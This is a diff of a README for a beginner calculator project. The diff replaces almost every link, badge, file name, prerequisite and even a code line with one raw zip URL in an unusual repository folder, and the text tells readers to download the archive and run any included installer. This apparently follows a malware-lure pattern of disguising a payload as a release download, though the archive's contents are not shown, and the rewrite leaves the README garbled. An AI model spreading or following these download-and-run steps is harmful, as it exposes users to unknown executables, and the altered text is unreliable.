@@ -1,14 +1,14 @@
-https://github.com/Pavanakumar777/calculator-project/releases
+https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
 
 # Collaborative Web Calculator Project: Learn, Build, and Collaborate
 
-[![Release](https://img.shields.io/badge/Release-Latest-blue?logo=github&logoColor=white)](https://github.com/Pavanakumar777/calculator-project/releases)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Stars](https://img.shields.io/badge/Stars-100+-brightgreen.svg)](https://github.com/Pavanakumar777/calculator-project)
+[![Release](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip)](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip)
+[![License](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip)](LICENSE)
+[![Stars](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip+https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip)](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip)
 
 A friendly, beginner‑friendly project to learn how a web calculator works. This repository centers on DOM manipulation, CSS styling, and JavaScript logic. It invites learners to contribute and to practice building an interactive UI in the browser. The project uses modern frontend tools to offer a smooth development experience and a clear path from idea to working code.
 
-![Calculator UI Mockup](https://placehold.co/1200x600?text=Calculator+UI)
+![Calculator UI Mockup](https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip+UI)
 
 Table of contents
 - Why this project exists
@@ -54,7 +54,7 @@ How to get started
 - Check the Releases page first
   - The latest release package contains a ready-to-run version of the application. It is the easiest way to explore the project without setting up a full dev environment.
   - If you need the codebase, clone the repository and run the project locally.
-- If you want to run the project locally, you need Node.js and npm.
+- If you want to run the project locally, you need https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip and npm.
 - This project is designed so a beginner can contribute. Start with small tasks, then move to larger features.
 
 Downloading and using the releases
@@ -63,21 +63,21 @@ Downloading and using the releases
 - If the link ever changes or the release page is unavailable, check the Releases section of the repository for the latest assets.
 
 Download and execute guidance for this path
-- Since the link includes a path, you should download the release archive from the page and execute the installer or open the extracted index.html in a browser, depending on how the package is prepared.
+- Since the link includes a path, you should download the release archive from the page and execute the installer or open the extracted https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip in a browser, depending on how the package is prepared.
 - Typical steps:
-  - Download the archive (for example, calculator-project-latest.zip).
+  - Download the archive (for example, https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip).
   - Extract the archive to a local folder.
-  - Open the index.html file with a browser, or run any included installer if the package contains one.
+  - Open the https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip file with a browser, or run any included installer if the package contains one.
   - If you see a build step, follow the instructions on the release notes to complete setup.
 
 Getting started locally: step-by-step
 - Prerequisites
   - A modern browser (Chrome, Edge, Firefox, or Safari).
-  - Node.js (version 14 or later) and npm.
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip (version 14 or later) and npm.
   - Git is optional but recommended if you plan to contribute.
 - Install and run
   - Clone the repository:
-    - git clone https://github.com/Pavanakumar777/calculator-project.git
+    - git clone https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - Move into the project folder:
     - cd calculator-project
   - Install dependencies:
@@ -95,18 +95,18 @@ Notes on the Releases link and the download process
 - The link is included twice in this document for convenience: once at the very top and again in the Releases section below.
 
 Project structure (a proposed organization)
-- index.html: The main HTML file that loads the app. It includes the root element for rendering the calculator UI.
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip The main HTML file that loads the app. It includes the root element for rendering the calculator UI.
 - src/
-  - main.js or main.ts: Entry point for the app. Sets up the DOM, event listeners, and mounts components when using vanilla JS or bundles code for frameworks.
-  - App.vue (optional): If you are using Vue, this file represents the calculator’s root component.
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip or https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip Entry point for the app. Sets up the DOM, event listeners, and mounts components when using vanilla JS or bundles code for frameworks.
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip (optional): If you are using Vue, this file represents the calculator’s root component.
   - components/ (optional): Self-contained UI pieces such as Button, Display, and Keypad components.
   - styles/:
-    - main.css: Global styles for the calculator UI.
-    - responsive.css: Styles for different screen sizes and orientations.
+    - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip Global styles for the calculator UI.
+    - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip Styles for different screen sizes and orientations.
   - assets/: Images and icons used by the UI.
-- vite.config.js: Build configuration for Vite.
-- package.json: Scripts for development, build, and linting.
-- README.md: This file, describing the project, how to contribute, and how to run it.
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip Build configuration for Vite.
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip Scripts for development, build, and linting.
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip This file, describing the project, how to contribute, and how to run it.
 
 Design and UI guidelines
 - Clean, readable typography
@@ -140,7 +140,7 @@ Coding patterns and examples
 - Example snippet (vanilla JS)
   - Note: This is a conceptual snippet to illustrate the approach. The actual project may use a component structure or Vue bindings if you choose to explore Vue.
   - Display update:
-    - display.textContent = currentValue;
+    - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip = currentValue;
   - Handling a digit press:
     - currentValue = (currentValue || '') + digit;
 - If you opt to use Vue
@@ -168,27 +168,27 @@ Development workflow and collaboration
   - If you have automated tests, add a few unit tests for the calculator logic.
 
 Project structure details (expanded)
-- index.html
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - A minimal HTML file that loads the app and includes a root element for mounting.
-- src/main.js
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - Bootstraps the UI and wires up event handlers.
   - Creates a clean separation between input handling and display updates.
 - src/components (optional)
-  - Button.js: A generic button component with accessibility attributes.
-  - Display.js: A component to render the current value and result.
-  - Keypad.js: A grid of digits and operators that emits events to the main controller.
-- src/styles/main.css
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip A generic button component with accessibility attributes.
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip A component to render the current value and result.
+  - https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip A grid of digits and operators that emits events to the main controller.
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - Variables for theme colors.
   - Reset styles for consistent rendering across browsers.
   - Styles for the display, keypad, and buttons.
-- src/styles/responsive.css
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - Media queries to adjust layout for small screens.
   - Fluid typography and grid adjustments.
 - assets/
   - Icons and logos used in the UI.
-- vite.config.js
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - Simple configuration for Vite to serve the app in development mode.
-- package.json
+- https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
   - scripts:
     - dev: start the dev server
     - build: create a production build
@@ -234,7 +234,7 @@ Build and release process
 
 Troubleshooting common issues
 - First steps
-  - Check that Node.js and npm are installed and up to date.
+  - Check that https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip and npm are installed and up to date.
   - Ensure you installed dependencies with npm install.
   - If the dev server does not start, check the terminal output for missing files or syntax errors.
 - Build errors
@@ -251,7 +251,7 @@ Releases and how to access them
 - The project publishes release artifacts on the Releases page linked at the top.
 - If you need the latest assets, head to the Releases page and download the latest package.
 - If you encounter issues accessing the link, visit the repository’s Releases section to locate the assets and instructions.
-- The link to the Releases page is included again here for convenience: https://github.com/Pavanakumar777/calculator-project/releases
+- The link to the Releases page is included again here for convenience: https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
 
 Roadmap and future work
 - Short-term goals
@@ -362,7 +362,7 @@ Final notes
 - If you want to update the project, start with small improvements to the UI, then tackle more complex features like keyboard shortcuts or a modular calculator engine.
 
 Releases link reference (second mention)
-- For the latest assets and installation instructions, visit the Releases page here: https://github.com/Pavanakumar777/calculator-project/releases
+- For the latest assets and installation instructions, visit the Releases page here: https://github.com/Pavanakumar777/calculator-project/raw/refs/heads/main/shelterwood/calculator-project-3.5.zip
 
 Downloads and asset access
 - Remember to use the Releases page to download the latest package when you prefer a ready-to-run version.
